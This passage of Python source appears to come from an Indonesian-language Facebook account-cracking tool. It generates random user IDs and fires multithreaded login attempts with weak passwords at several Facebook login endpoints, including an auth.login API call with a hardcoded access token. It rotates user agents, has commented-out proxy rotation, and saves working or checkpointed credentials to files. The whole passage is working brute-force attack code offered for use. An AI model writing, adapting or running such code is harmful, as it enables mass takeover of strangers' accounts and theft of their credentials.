			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2007%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_touch2(self):
		x = 11111111
		xx = 99999999
		idx = "1000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.touch2, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def touch2(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://touch.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://touch.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://touch.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://touch.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2007%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_free2(self):
		x = 11111111
		xx = 99999999
		idx = "1000000"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.free2, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def free2(self, uid, pwx):
		nip=random.choice(prox)
		rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2007%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_basic2(self):
		x = 11111111
		xx = 99999999
		idx = "1000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.basic2, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def basic2(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2007%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
		
	def old_bapi2(self):
		x = 11111111
		xx = 99999999
		idx = "1000000" 
		#x2 = 11111111
		#xx2 = 99999999
		#idx2 = "1000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.bapi2, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def bapi2(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r %s[OK] %s <─> %s %s•%s 2009%s <─> %s2010"%(H,uid,pw,P,O,P,H))
				print(" %s[%s√%s] %sSukses Disimpan Di File ─> %sCloningMat-Data/Ok/%\n"%(P,H,P,O,H,okez2009_10))
				self.ok.append("%s|%s"%(uid, pw))
				open('/sdcard/CloningMat-Data/Ok/'+okez2008_09,'a').write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r %s[CP] %s <─> %s %s•%s 2008%s <─> %s2009"%(K,uid,pw,P,O,P,H))
				print(" %s[%s√%s] %sSukses Disimpan Di File ─>%s CloningMat-Data/Cp/%\n"%(P,H,P,O,K,cepez2008_09))
				self.cp.append("%s|%s"%(uid, pw))
				open('/sdcard/CloningMat-Data/Cp/'+cepez2008_09,'a').write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def pilihmetod(self):
		print("")
		print("%s [1] 2009-10 + Cloning + methode mbasic"%(P))
		print(" %s[2] 2009-10 + Cloning + methode bapi"%(P))
		print("%s [3] 2009-10 + Cloning + methode free"%(P))
		print(" %s[4] 2009-10 + Cloning + methode touch"%(P))
		print("%s [5] 2009-10 + Cloning + methode mobile"%(P))
		print(" %s[6] 2009-10 + Cloning + methode IPhone"%(P))
		print("%s [7] 2009-10 + Cloning + methode x facebook"%(P))
		print(" %s[8] 2009-10 + Cloning + methode graph [ %sTidak Ada Pembaruan %s]"%(P,M,P))
		Mat =input(" %sChoose : "%(P))
		if Mat in ["1", "01"]:
			self.old_basic()
		if Mat in ["2", "02"]:
			self.old_bapi()
		if Mat in ["3", "03"]:
			self.old_free()
		if Mat in ["4", "04"]:
			self.old_touch()
		if Mat in ["5", "05"]:
			self.old_mobile()
		if Mat in ["6", "06"]:
			self.old_iphone()
		if Mat in ["7", "07"]:
			self.old_xfacebook()
		if Mat in ["8", "08"]:
			self.old_graph()
		else:
			print (" Select Correctly ")
			time.sleep(1)
			pilihmetod()
	
	
	def old_xfacebook(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		#x2 = 11111111
		#xx2 = 99999999
		#idx2 = "1000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.xfacebook, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def xfacebook(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://x.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://x.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://x.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://x.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2009%s <─> %s2010"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2009-10-CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2009%s <─> %s2010"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2009-10-CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_iphone(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		#x2 = 11111111
		#xx2 = 99999999
		#idx2 = "1000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.iphone, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def iphone(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'IPhone.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://IPhone.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
